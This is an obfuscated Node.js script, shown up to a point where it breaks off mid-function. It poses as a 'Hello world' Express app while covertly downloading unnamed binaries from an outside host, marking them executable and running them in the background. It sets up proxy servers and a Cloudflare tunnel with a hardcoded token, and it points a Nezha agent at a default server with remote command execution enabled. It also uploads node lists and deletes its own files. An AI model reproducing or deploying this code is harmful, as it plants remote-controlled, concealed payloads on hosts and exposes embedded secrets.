const _0x2260a3=_0x2463;(function(_0x3bdf8a,_0x551d7d){const _0x2cf377={_0x44f8c0:0x1c0,_0xb4d11:0x201,_0x49aec7:0x232,_0x322498:0x17c,_0x1c49b3:0x1d0,_0x386616:0x1d7},_0x515ab3=_0x2463,_0x37b495=_0x3bdf8a();while(!![]){try{const _0x2bb0f7=-parseInt(_0x515ab3(_0x2cf377._0x44f8c0))/0x1+parseInt(_0x515ab3(_0x2cf377._0xb4d11))/0x2+-parseInt(_0x515ab3(_0x2cf377._0x49aec7))/0x3*(-parseInt(_0x515ab3(0x1b2))/0x4)+-parseInt(_0x515ab3(_0x2cf377._0x322498))/0x5+parseInt(_0x515ab3(0x1ac))/0x6*(-parseInt(_0x515ab3(_0x2cf377._0x1c49b3))/0x7)+-parseInt(_0x515ab3(0x1bf))/0x8*(parseInt(_0x515ab3(_0x2cf377._0x386616))/0x9)+parseInt(_0x515ab3(0x238))/0xa;if(_0x2bb0f7===_0x551d7d)break;else _0x37b495['push'](_0x37b495['shift']());}catch(_0x26de6b){_0x37b495['push'](_0x37b495['shift']());}}}(_0x5afb,0xa6d89));const express=require(_0x2260a3(0x1a1)),app=express(),axios=require(_0x2260a3(0x1ce)),os=require('os'),fs=require('fs'),path=require(_0x2260a3(0x190)),{promisify}=require(_0x2260a3(0x188)),exec=promisify(require(_0x2260a3(0x18a))[_0x2260a3(0x1d5)]),{execSync}=require(_0x2260a3(0x18a)),UPLOAD_URL=process[_0x2260a3(0x19f)][_0x2260a3(0x21a)]||'',PROJECT_URL=process[_0x2260a3(0x19f)][_0x2260a3(0x17d)]||'',AUTO_ACCESS=process['env'][_0x2260a3(0x1f3)]||![],FILE_PATH=process['env'][_0x2260a3(0x1a5)]||'./tmp',SUB_PATH=process[_0x2260a3(0x19f)]['SUB_PATH']||_0x2260a3(0x17a),PORT=process[_0x2260a3(0x19f)][_0x2260a3(0x1e3)]||process[_0x2260a3(0x19f)]['PORT']||0xbb8,UUID=process[_0x2260a3(0x19f)][_0x2260a3(0x20e)]||_0x2260a3(0x1c7),NEZHA_SERVER=process[_0x2260a3(0x19f)][_0x2260a3(0x195)]||'youhs.tk:80',NEZHA_PORT=process[_0x2260a3(0x19f)][_0x2260a3(0x1b3)]||'',NEZHA_KEY=process[_0x2260a3(0x19f)][_0x2260a3(0x219)]||_0x2260a3(0x1f2),ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x2260a3(0x1a8),ARGO_AUTH=process['env'][_0x2260a3(0x23d)]||_0x2260a3(0x224),ARGO_PORT=process[_0x2260a3(0x19f)][_0x2260a3(0x184)]||0x1f41,CFIP=process[_0x2260a3(0x19f)][_0x2260a3(0x1ea)]||_0x2260a3(0x198),CFPORT=process[_0x2260a3(0x19f)]['CFPORT']||0x1bb,NAME=process[_0x2260a3(0x19f)][_0x2260a3(0x1ae)]||'';!fs[_0x2260a3(0x1aa)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x2260a3(0x1d1)](FILE_PATH+_0x2260a3(0x1e4))):console['log'](FILE_PATH+_0x2260a3(0x1fa));function generateRandomName(){const _0x49a9c4={_0x1d2f3b:0x22a},_0x516091=_0x2260a3,_0x267c79=_0x516091(0x1a0);let _0x222db2='';for(let _0xcd04f7=0x0;_0xcd04f7<0x6;_0xcd04f7++){_0x222db2+=_0x267c79[_0x516091(0x1b7)](Math[_0x516091(_0x49a9c4._0x1d2f3b)](Math[_0x516091(0x182)]()*_0x267c79['length']));}return _0x222db2;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x5afb(){const _0x269ced=['readFileSync','\x20-p\x20','339ElYEqR','boot.log','Content-Type','php\x20running\x20error:\x20','https://amd64.ssss.nyc.mn/agent','\x20-c\x20\x22','34967510nbGsnJ','countryCode','blackhole','\x0a\x0avmess://','data','ARGO_AUTH','tcp','utf-8','?security=tls&sni=','https://ipapi.co/json/','automatic\x20access\x20task\x20added\x20successfully','sub','quic','4103545ycNtCC','PROJECT_URL','/trojan-argo','\x0a\x0atrojan://','http\x20server\x20is\x20running\x20on\x20port:','Unknown','random','filter','ARGO_PORT','\x0a\x20\x20tunnel:\x20','2096','tunnel.json','util','error','child_process','nohup\x20','\x0avless://','/api/delete-nodes','rm\x20-rf\x20','org','path','text/plain;\x20charset=utf-8','block','2083','pipe','NEZHA_SERVER','/vmess-argo','NEZHA\x20variable\x20is\x20empty,skip\x20running','cdns.doon.eu.org','direct','aarch64','push','split','writeFileSync','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','env','abcdefghijklmnopqrstuvwxyz','express','config.json','unshift','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','FILE_PATH','https://arm64.ssss.nyc.mn/bot','isFile','koyeb.youhs.ggff.net','2087','existsSync','https+local://8.8.8.8/dns-query','2137434wjmGlq','Hello\x20world!','NAME','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','del\x20/f\x20/q\x20','stringify','2996ztNbFV','NEZHA_PORT','send','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','test','charAt','sub.txt','127.0.0.1','/api/add-subscriptions','Subscription\x20uploaded\x20successfully','/api/add-nodes','/vless-argo','/dev/null','16mzyfEG','643204yWgRmw','TunnelSecret','\x20>\x20nul\x202>&1','pkill\x20-f\x20\x22[','\x20-c\x20','length','catch','907b73e9-b9e3-419f-a852-2fdd4fdd9756','Add\x20automatic\x20access\x20task\x20faild:\x20','Error\x20reading\x20boot.log:','http://ip-api.com/json/','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','/config.json\x20>/dev/null\x202>&1\x20&','all','axios','listen','7rrbWrl','log','base64','from','country_code','exec','pop','5208453ZUpHxj','then','Error\x20in\x20startserver:','unlinkSync','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','.exe\x20>\x20nul\x202>&1','Skipping\x20adding\x20automatic\x20access\x20task','match','?encryption=none&security=tls&sni=','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','forEach','\x20>/dev/null\x202>&1\x20&','SERVER_PORT','\x20is\x20created','get','trojan','Error\x20downloading\x20files:','toString','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','CFIP','\x20-s\x20','has','/vmess-argo?ed=2560','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','443','finish','win32','vZeLtIZV9E7BPLBi02YMj7w4cprQuVFE','AUTO_ACCESS','Empowerment\x20success\x20for\x20','\x20failed:\x20','mkdirSync','http','Download\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20already\x20exists','readdirSync','ArgoDomain:','vmess','none','https://amd64.ssss.nyc.mn/bot','8443','159198CaenZx','\x20is\x20running','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Nodes\x20uploaded\x20successfully','freedom','close','taskkill\x20/f\x20/im\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','&path=%2Fvless-argo%3Fed%3D2560#','join','application/json','\x0a\x20\x20credentials-file:\x20','response','UUID','\x22\x20>\x20/dev/null\x202>&1','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Error\x20executing\x20command:\x20','includes','arm','fileUrl','tls','amd','post','2053','NEZHA_KEY','UPLOAD_URL','false','\x0aclient_secret:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','clear','message','App\x20is\x20running','/tunnel.yml\x20run','list.txt','arch','eyJhIjoiZDU3MzRjMzE1ZDViODNhNTNhNWViNjI3MzViY2QzZjgiLCJ0IjoiNjAzZjZiYzAtMTE3Zi00ZGZiLWJiMmUtMzg3ZjEzOGMwZGNkIiwicyI6Ik1UUXdNbU0yWkRZdE1HWTFNeTAwTXpRMUxUazRNRGt0TXpSa05EQTNaR000T0dZdyJ9','stream','vless','arm64','success','status','floor','npm\x20running\x20error:\x20','\x20>/dev/null\x202>&1','platform','basename','--tls'];_0x5afb=function(){return _0x269ced;};return _0x5afb();}let npmPath=path[_0x2260a3(0x20a)](FILE_PATH,npmName),phpPath=path[_0x2260a3(0x20a)](FILE_PATH,phpName),webPath=path[_0x2260a3(0x20a)](FILE_PATH,webName),botPath=path[_0x2260a3(0x20a)](FILE_PATH,botName),subPath=path[_0x2260a3(0x20a)](FILE_PATH,_0x2260a3(0x1b8)),listPath=path[_0x2260a3(0x20a)](FILE_PATH,_0x2260a3(0x222)),bootLogPath=path[_0x2260a3(0x20a)](FILE_PATH,_0x2260a3(0x233)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x5b2807={_0x218dc6:0x176,_0x54ea06:0x1d2,_0x3f7a72:0x176,_0xa9c22c:0x183,_0x21f359:0x20b,_0x41ac9c:0x1c6},_0x43f99d=_0x2260a3;try{if(!UPLOAD_URL)return;if(!fs[_0x43f99d(0x1aa)](subPath))return;let _0x5e3a9a;try{_0x5e3a9a=fs['readFileSync'](subPath,_0x43f99d(_0x5b2807._0x218dc6));}catch{return null;}const _0xb7955e=Buffer[_0x43f99d(0x1d3)](_0x5e3a9a,_0x43f99d(_0x5b2807._0x54ea06))[_0x43f99d(0x1e8)](_0x43f99d(_0x5b2807._0x3f7a72)),_0xa81f0=_0xb7955e['split']('\x0a')[_0x43f99d(_0x5b2807._0xa9c22c)](_0x573dce=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x43f99d(0x1b6)](_0x573dce));if(_0xa81f0['length']===0x0)return;return axios[_0x43f99d(0x217)](UPLOAD_URL+_0x43f99d(0x18d),JSON['stringify']({'nodes':_0xa81f0}),{'headers':{'Content-Type':_0x43f99d(_0x5b2807._0x21f359)}})[_0x43f99d(_0x5b2807._0x41ac9c)](_0x56e007=>{return null;}),null;}catch(_0x3303e5){return null;}}function cleanupOldFiles(){const _0x2a5824={_0x3b8eb6:0x1da},_0x26723d=_0x2260a3;try{const _0x4cb033=fs[_0x26723d(0x1fb)](FILE_PATH);_0x4cb033[_0x26723d(0x1e1)](_0xbfa825=>{const _0x45d4db=_0x26723d,_0x395cdc=path['join'](FILE_PATH,_0xbfa825);try{const _0x2092bf=fs['statSync'](_0x395cdc);_0x2092bf[_0x45d4db(0x1a7)]()&&fs[_0x45d4db(_0x2a5824._0x3b8eb6)](_0x395cdc);}catch(_0x55a017){}});}catch(_0x9681f4){}}app[_0x2260a3(0x1e5)]('/',function(_0x377166,_0x5dc922){const _0x52adb6=_0x2260a3;_0x5dc922['send'](_0x52adb6(0x1ad));});async function generateConfig(){const _0x480b9f={_0xc2445b:0x1be,_0x46a66e:0x23e,_0x46ad72:0x1fe,_0x287216:0x1bd,_0x5b7c40:0x1f7,_0x18017a:0x215,_0x4dd31c:0x1fd,_0x57ab41:0x196,_0x2d131e:0x215,_0x5751f2:0x17b,_0x329a94:0x1e6,_0x1c588c:0x215,_0x2edb0c:0x1ab,_0x395d65:0x199,_0x55fde2:0x192,_0x58f8cc:0x19d,_0x3dba5d:0x1b1},_0x1a8af9=_0x2260a3,_0x1c24db={'log':{'access':_0x1a8af9(_0x480b9f._0xc2445b),'error':_0x1a8af9(0x1be),'loglevel':_0x1a8af9(0x1fe)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1a8af9(0x226),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x1a8af9(0x1bd),'dest':0xbba},{'path':_0x1a8af9(0x196),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x1a8af9(0x1b9),'protocol':_0x1a8af9(0x226),'settings':{'clients':[{'id':UUID}],'decryption':_0x1a8af9(0x1fe)},'streamSettings':{'network':_0x1a8af9(_0x480b9f._0x46a66e),'security':'none'}},{'port':0xbba,'listen':_0x1a8af9(0x1b9),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x1a8af9(_0x480b9f._0x46ad72),'wsSettings':{'path':_0x1a8af9(_0x480b9f._0x287216)}},'sniffing':{'enabled':!![],'destOverride':[_0x1a8af9(_0x480b9f._0x5b7c40),_0x1a8af9(_0x480b9f._0x18017a),_0x1a8af9(0x17b)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1a8af9(0x1b9),'protocol':_0x1a8af9(_0x480b9f._0x4dd31c),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1a8af9(_0x480b9f._0x57ab41)}},'sniffing':{'enabled':!![],'destOverride':[_0x1a8af9(0x1f7),_0x1a8af9(_0x480b9f._0x2d131e),_0x1a8af9(_0x480b9f._0x5751f2)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x1a8af9(_0x480b9f._0x329a94),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1a8af9(0x1fe),'wsSettings':{'path':_0x1a8af9(0x17e)}},'sniffing':{'enabled':!![],'destOverride':[_0x1a8af9(_0x480b9f._0x5b7c40),_0x1a8af9(_0x480b9f._0x1c588c),_0x1a8af9(0x17b)],'metadataOnly':![]}}],'dns':{'servers':[_0x1a8af9(_0x480b9f._0x2edb0c)]},'outbounds':[{'protocol':_0x1a8af9(0x205),'tag':_0x1a8af9(_0x480b9f._0x395d65)},{'protocol':_0x1a8af9(0x23a),'tag':_0x1a8af9(_0x480b9f._0x55fde2)}]};fs[_0x1a8af9(_0x480b9f._0x58f8cc)](path[_0x1a8af9(0x20a)](FILE_PATH,_0x1a8af9(0x1a2)),JSON[_0x1a8af9(_0x480b9f._0x3dba5d)](_0x1c24db,null,0x2));}function getSystemArchitecture(){const _0x1096e0={_0x14cee1:0x213,_0x43adf8:0x227,_0x4e8307:0x216},_0x19e41b=_0x2260a3,_0x246738=os[_0x19e41b(0x223)]();return _0x246738===_0x19e41b(_0x1096e0._0x14cee1)||_0x246738===_0x19e41b(_0x1096e0._0x43adf8)||_0x246738===_0x19e41b(0x19a)?_0x19e41b(0x213):_0x19e41b(_0x1096e0._0x4e8307);}function downloadFile(_0x24b760,_0x56e0a2,_0xb1a760){const _0x32ad99={_0x22c864:0x1f6,_0x249707:0x225,_0x19ce29:0x1d8,_0x2be247:0x1c6},_0x245c2e={_0x13ac8e:0x1f5,_0x57cfb0:0x21f,_0x153fde:0x189},_0x5b459f={_0x1d9d84:0x23c,_0xb2f00c:0x1f0},_0x1b5c79={_0x10f191:0x1f5},_0x3a504c=_0x2260a3,_0x476e2d=_0x24b760;!fs[_0x3a504c(0x1aa)](FILE_PATH)&&fs[_0x3a504c(_0x32ad99._0x22c864)](FILE_PATH,{'recursive':!![]});const _0x5295a0=fs['createWriteStream'](_0x476e2d);axios({'method':_0x3a504c(0x1e5),'url':_0x56e0a2,'responseType':_0x3a504c(_0x32ad99._0x249707)})[_0x3a504c(_0x32ad99._0x19ce29)](_0x5e2ad6=>{const _0x51173d={_0x5ad96b:0x1d1,_0x2bffe5:0x22e},_0x2303a0=_0x3a504c;_0x5e2ad6[_0x2303a0(_0x5b459f._0x1d9d84)][_0x2303a0(0x194)](_0x5295a0),_0x5295a0['on'](_0x2303a0(_0x5b459f._0xb2f00c),()=>{const _0x212feb=_0x2303a0;_0x5295a0[_0x212feb(0x206)](),console[_0x212feb(_0x51173d._0x5ad96b)](_0x212feb(0x1f8)+path[_0x212feb(_0x51173d._0x2bffe5)](_0x476e2d)+'\x20successfully'),_0xb1a760(null,_0x476e2d);}),_0x5295a0['on']('error',_0x5ac972=>{const _0x28d33a=_0x2303a0;fs['unlink'](_0x476e2d,()=>{});const _0x5d81f6=_0x28d33a(0x1f8)+path[_0x28d33a(0x22e)](_0x476e2d)+_0x28d33a(_0x1b5c79._0x10f191)+_0x5ac972[_0x28d33a(0x21f)];console['error'](_0x5d81f6),_0xb1a760(_0x5d81f6);});})[_0x3a504c(_0x32ad99._0x2be247)](_0x290860=>{const _0x5c095d=_0x3a504c,_0x12579e=_0x5c095d(0x1f8)+path[_0x5c095d(0x22e)](_0x476e2d)+_0x5c095d(_0x245c2e._0x13ac8e)+_0x290860[_0x5c095d(_0x245c2e._0x57cfb0)];console[_0x5c095d(_0x245c2e._0x153fde)](_0x12579e),_0xb1a760(_0x12579e);});}async function downloadFilesAndRun(){const _0x8f6c4c={_0x4807df:0x1c5,_0x506ccd:0x1d1,_0x557acb:0x1e0,_0x433102:0x1cd,_0x4b7c0a:0x1e7,_0x245bb2:0x200,_0x3dcc3e:0x186,_0x2345be:0x218,_0x493cc1:0x1ec,_0x2bc41d:0x21b,_0x27fd1e:0x21c,_0x35de4d:0x19e,_0x453656:0x21d,_0x3c672c:0x20a,_0xee58bf:0x18b,_0xbf6f32:0x237,_0x9fd456:0x1cb,_0x10661d:0x1d1,_0x4803d3:0x200,_0x5f1be8:0x1a9,_0x11c178:0x218,_0x33b366:0x22f,_0x1a7189:0x1eb,_0x151714:0x231,_0x23a656:0x1d1,_0x464e64:0x189,_0x215989:0x18b,_0x4d3a5a:0x1c4,_0x3d456c:0x1cc,_0x82b12e:0x202,_0x21fd7f:0x189,_0x60aaff:0x1aa,_0xf20d42:0x1de,_0x352359:0x211},_0xde2595=_0x2260a3,_0x20389e=getSystemArchitecture(),_0x55894e=getFilesForArchitecture(_0x20389e);if(_0x55894e[_0xde2595(_0x8f6c4c._0x4807df)]===0x0){console[_0xde2595(_0x8f6c4c._0x506ccd)](_0xde2595(_0x8f6c4c._0x557acb));return;}const _0x2df066=_0x55894e['map'](_0x421f33=>{const _0x5a81f0={_0x760dee:0x214};return new Promise((_0x1d89fe,_0x2066d8)=>{const _0x25ef0f=_0x2463;downloadFile(_0x421f33['fileName'],_0x421f33[_0x25ef0f(_0x5a81f0._0x760dee)],(_0x2499a2,_0x114b89)=>{_0x2499a2?_0x2066d8(_0x2499a2):_0x1d89fe(_0x114b89);});});});try{await Promise[_0xde2595(_0x8f6c4c._0x433102)](_0x2df066);}catch(_0x4f45c6){console['error'](_0xde2595(_0x8f6c4c._0x4b7c0a),_0x4f45c6);return;}function _0x379a4c(_0x5028d3){const _0x584e47=0x1fd;_0x5028d3['forEach'](_0x1368fc=>{const _0x3688f7=_0x2463;fs[_0x3688f7(0x1aa)](_0x1368fc)&&fs['chmod'](_0x1368fc,_0x584e47,_0x1ea3b2=>{const _0x1c1741=_0x3688f7;_0x1ea3b2?console[_0x1c1741(0x189)]('Empowerment\x20failed\x20for\x20'+_0x1368fc+':\x20'+_0x1ea3b2):console[_0x1c1741(0x1d1)](_0x1c1741(0x1f4)+_0x1368fc+':\x20'+_0x584e47['toString'](0x8));});});}const _0x257c25=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x379a4c(_0x257c25);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1955a1=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0xde2595(0x19c)](':')[_0xde2595(0x1d6)]():'',_0x237b1f=new Set(['443',_0xde2595(_0x8f6c4c._0x245bb2),_0xde2595(_0x8f6c4c._0x3dcc3e),_0xde2595(0x1a9),_0xde2595(0x193),_0xde2595(_0x8f6c4c._0x2345be)]),_0x4f68bf=_0x237b1f[_0xde2595(_0x8f6c4c._0x493cc1)](_0x1955a1)?'true':_0xde2595(_0x8f6c4c._0x2bc41d),_0x3ed5c4=_0xde2595(_0x8f6c4c._0x27fd1e)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0xde2595(_0x8f6c4c._0x35de4d)+_0x4f68bf+_0xde2595(_0x8f6c4c._0x453656)+UUID;fs[_0xde2595(0x19d)](path[_0xde2595(_0x8f6c4c._0x3c672c)](FILE_PATH,'config.yaml'),_0x3ed5c4);const _0x4da22e=_0xde2595(_0x8f6c4c._0xee58bf)+phpPath+_0xde2595(_0x8f6c4c._0xbf6f32)+FILE_PATH+_0xde2595(_0x8f6c4c._0x9fd456);try{await exec(_0x4da22e),console[_0xde2595(_0x8f6c4c._0x10661d)](phpName+_0xde2595(0x202)),await new Promise(_0x311c39=>setTimeout(_0x311c39,0x3e8));}catch(_0x17b62d){console[_0xde2595(0x189)](_0xde2595(0x235)+_0x17b62d);}}else{let _0x56c29b='';const _0x1d71cd=[_0xde2595(0x1ef),_0xde2595(_0x8f6c4c._0x4803d3),'2096',_0xde2595(_0x8f6c4c._0x5f1be8),_0xde2595(0x193),_0xde2595(_0x8f6c4c._0x11c178)];_0x1d71cd['includes'](NEZHA_PORT)&&(_0x56c29b=_0xde2595(_0x8f6c4c._0x33b366));const _0x263b11=_0xde2595(0x18b)+npmPath+_0xde2595(_0x8f6c4c._0x1a7189)+NEZHA_SERVER+':'+NEZHA_PORT+_0xde2595(_0x8f6c4c._0x151714)+NEZHA_KEY+'\x20'+_0x56c29b+_0xde2595(0x210);try{await exec(_0x263b11),console[_0xde2595(_0x8f6c4c._0x23a656)](npmName+'\x20is\x20running'),await new Promise(_0x16028f=>setTimeout(_0x16028f,0x3e8));}catch(_0x166494){console[_0xde2595(_0x8f6c4c._0x464e64)](_0xde2595(0x22b)+_0x166494);}}}else console[_0xde2595(0x1d1)](_0xde2595(0x197));const _0x5b8fbe=_0xde2595(_0x8f6c4c._0x215989)+webPath+_0xde2595(_0x8f6c4c._0x4d3a5a)+FILE_PATH+_0xde2595(_0x8f6c4c._0x3d456c);try{await exec(_0x5b8fbe),console[_0xde2595(_0x8f6c4c._0x506ccd)](webName+_0xde2595(_0x8f6c4c._0x82b12e)),await new Promise(_0x28a7a7=>setTimeout(_0x28a7a7,0x3e8));}catch(_0x2101d9){console[_0xde2595(_0x8f6c4c._0x21fd7f)]('web\x20running\x20error:\x20'+_0x2101d9);}if(fs[_0xde2595(_0x8f6c4c._0x60aaff)](botPath)){let _0x158fa2;if(ARGO_AUTH[_0xde2595(_0x8f6c4c._0xf20d42)](/^[A-Z0-9a-z=]{120,250}$/))_0x158fa2=_0xde2595(0x1af)+ARGO_AUTH;else ARGO_AUTH[_0xde2595(_0x8f6c4c._0xf20d42)](/TunnelSecret/)?_0x158fa2=_0xde2595(0x1ee)+FILE_PATH+_0xde2595(0x221):_0x158fa2='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0xde2595(0x208)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x158fa2+_0xde2595(0x1e2)),console[_0xde2595(0x1d1)](botName+'\x20is\x20running'),await new Promise(_0x15b939=>setTimeout(_0x15b939,0x7d0));}catch(_0x5042a8){console['error'](_0xde2595(_0x8f6c4c._0x352359)+_0x5042a8);}}await new Promise(_0xaef6aa=>setTimeout(_0xaef6aa,0x1388));}function _0x2463(_0x25fbda,_0x26fec9){const _0x5afb2a=_0x5afb();return _0x2463=function(_0x24634a,_0x3b801d){_0x24634a=_0x24634a-0x176;let _0x516c6f=_0x5afb2a[_0x24634a];return _0x516c6f;},_0x2463(_0x25fbda,_0x26fec9);}function getFilesForArchitecture(_0x566c7b){const _0x11aa40={_0x346b4b:0x236,_0x1e5808:0x1a3},_0x4d6970=_0x2260a3;let _0x1833e9;_0x566c7b==='arm'?_0x1833e9=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x4d6970(0x1a6)}]:_0x1833e9=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x4d6970(0x1ff)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x18062f=_0x566c7b==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x4d6970(_0x11aa40._0x346b4b);_0x1833e9[_0x4d6970(_0x11aa40._0x1e5808)]({'fileName':npmPath,'fileUrl':_0x18062f});}else{const _0x595bf9=_0x566c7b==='arm'?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x1833e9['unshift']({'fileName':phpPath,'fileUrl':_0x595bf9});}}return _0x1833e9;}function argoType(){const _0x133506={_0x16641c:0x1d1,_0x2729e1:0x1b5,_0x1c2799:0x1c1,_0x9d071:0x20a,_0x46d19f:0x187,_0x3bde70:0x185,_0x239241:0x20c,_0x47f4b2:0x20a,_0x5447f2:0x1e9,_0x40812d:0x1a4,_0x3c80e8:0x1d1},_0x33bf1c=_0x2260a3;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x33bf1c(_0x133506._0x16641c)](_0x33bf1c(_0x133506._0x2729e1));return;}if(ARGO_AUTH[_0x33bf1c(0x212)](_0x33bf1c(_0x133506._0x1c2799))){fs['writeFileSync'](path[_0x33bf1c(_0x133506._0x9d071)](FILE_PATH,_0x33bf1c(_0x133506._0x46d19f)),ARGO_AUTH);const _0x59210a=_0x33bf1c(_0x133506._0x3bde70)+ARGO_AUTH['split']('\x22')[0xb]+_0x33bf1c(_0x133506._0x239241)+path[_0x33bf1c(_0x133506._0x47f4b2)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x33bf1c(_0x133506._0x5447f2)+ARGO_PORT+_0x33bf1c(_0x133506._0x40812d);fs[_0x33bf1c(0x19d)](path[_0x33bf1c(0x20a)](FILE_PATH,'tunnel.yml'),_0x59210a);}else console[_0x33bf1c(_0x133506._0x3c80e8)](_0x33bf1c(0x203));}async function extractDomains(){const _0x541b56={_0x57e716:0x176,_0x5d32b3:0x1c5,_0x42c85e:0x1d1,_0x23b6a2:0x1f9,_0x35bb70:0x18b,_0x43a8ea:0x1e2,_0x59e234:0x202,_0x1bc9f6:0x189},_0x18bea9={_0xa5288b:0x23c,_0x5025e8:0x1d4,_0x2c6bd8:0x18f,_0x5e6fc4:0x228,_0x51283e:0x239,_0x2dbdbd:0x239,_0x1c483b:0x23c},_0x5727a1={_0xe50e13:0x22d,_0x4aec42:0x1c3,_0x4cf80d:0x1b7},_0x581d74={_0x5dcdf1:0x1de},_0x3d16b6=_0x2260a3;let _0x47db67;if(ARGO_AUTH&&ARGO_DOMAIN)_0x47db67=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x47db67),await _0x13e3fe(_0x47db67);else try{const _0x190cdc=fs[_0x3d16b6(0x230)](path['join'](FILE_PATH,_0x3d16b6(0x233)),_0x3d16b6(_0x541b56._0x57e716)),_0x1354ad=_0x190cdc[_0x3d16b6(0x19c)]('\x0a'),_0x436eb1=[];_0x1354ad['forEach'](_0x1ff95c=>{const _0x245155=_0x3d16b6,_0x34bd7e=_0x1ff95c[_0x245155(_0x581d74._0x5dcdf1)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x34bd7e){const _0x46f704=_0x34bd7e[0x1];_0x436eb1[_0x245155(0x19b)](_0x46f704);}});if(_0x436eb1[_0x3d16b6(_0x541b56._0x5d32b3)]>0x0)_0x47db67=_0x436eb1[0x0],console[_0x3d16b6(_0x541b56._0x42c85e)](_0x3d16b6(0x1fc),_0x47db67),await _0x13e3fe(_0x47db67);else{console[_0x3d16b6(0x1d1)](_0x3d16b6(_0x541b56._0x23b6a2)),fs[_0x3d16b6(0x1da)](path['join'](FILE_PATH,_0x3d16b6(0x233)));async function _0x34dc65(){const _0x274b10=_0x3d16b6;try{process[_0x274b10(_0x5727a1._0xe50e13)]===_0x274b10(0x1f1)?await exec(_0x274b10(0x207)+botName+_0x274b10(0x1dc)):await exec(_0x274b10(_0x5727a1._0x4aec42)+botName[_0x274b10(_0x5727a1._0x4cf80d)](0x0)+']'+botName['substring'](0x1)+_0x274b10(0x20f));}catch(_0x6e94a){}}_0x34dc65(),await new Promise(_0x1ff9c3=>setTimeout(_0x1ff9c3,0xbb8));const _0x3c7fab='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3d16b6(0x208)+ARGO_PORT;try{await exec(_0x3d16b6(_0x541b56._0x35bb70)+botPath+'\x20'+_0x3c7fab+_0x3d16b6(_0x541b56._0x43a8ea)),console[_0x3d16b6(_0x541b56._0x42c85e)](botName+_0x3d16b6(_0x541b56._0x59e234)),await new Promise(_0x5dd3c9=>setTimeout(_0x5dd3c9,0xbb8)),await extractDomains();}catch(_0x4f9b78){console[_0x3d16b6(0x189)](_0x3d16b6(0x211)+_0x4f9b78);}}}catch(_0x285e9c){console[_0x3d16b6(_0x541b56._0x1bc9f6)](_0x3d16b6(0x1c9),_0x285e9c);}async function _0x43599e(){const _0xe92f2f=_0x3d16b6;try{const _0x5cbcfa=await axios['get'](_0xe92f2f(0x178),{'timeout':0xbb8});if(_0x5cbcfa[_0xe92f2f(0x23c)]&&_0x5cbcfa[_0xe92f2f(_0x18bea9._0xa5288b)][_0xe92f2f(0x1d4)]&&_0x5cbcfa[_0xe92f2f(0x23c)]['org'])return 